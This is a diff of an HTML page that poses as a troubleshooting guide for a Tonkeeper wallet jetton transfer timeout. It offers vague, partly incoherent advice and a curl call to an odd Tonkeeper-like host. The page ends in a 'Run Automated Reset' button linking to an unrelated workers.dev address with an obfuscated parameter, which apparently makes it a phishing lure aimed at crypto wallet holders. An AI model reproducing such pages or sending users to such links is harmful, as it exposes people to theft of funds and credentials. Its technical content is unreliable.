@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #121214;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -41,28 +41,26 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, indicating a failure in the transaction process that results in an infinite loop of attempts to complete the transfer.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the Tonkeeper Jetton transfer loop, which can be caused by network congestion, high gas fees, or issues with the smart contract.</li>
+<li>The error occurs due to a misconfiguration or overload in the TON (Telegram Open Network) ecosystem, specifically within the Tonkeeper wallet's interaction with the blockchain, leading to a timeout in the transaction loop.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the gas limit for the transaction</li>
-<li>Reduce the transaction fee to avoid network congestion</li>
-<li>Verify the smart contract code for any potential bugs or errors</li>
+<li>Check the TON blockchain for network congestion and high gas fees, which can slow down transactions.</li>
+<li>Verify that the Tonkeeper wallet is updated to the latest version to ensure compatibility with the current TON network state.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span><span class="m">0</span>:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="w"> </span>deploy<span class="w"> </span>--input<span class="w"> </span><span class="s2">&quot;{\&quot;_name\&quot;:\&quot;NewJetton\&quot;,\&quot;_symbol\&quot;:\&quot;NJ\&quot;}&quot;</span><span class="w"> </span>--keypair<span class="w"> </span>/path/to/keypair.json
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="s1">&#39;https://ton.apiTonkeeper.com/info&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: Bearer YOUR_ACCESS_TOKEN&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities. </p>
+<p>Consider utilizing an external console for more detailed network analysis. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonos-cli installed and configured on your system</li>
-<li>A valid keypair for the Ton network</li>
-<li>Basic understanding of Ton network and smart contract interactions</li>
+<li>Access to the TON blockchain explorer</li>
+<li>Latest version of the Tonkeeper wallet installed</li>
+<li>A basic understanding of blockchain transactions and gas fees</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
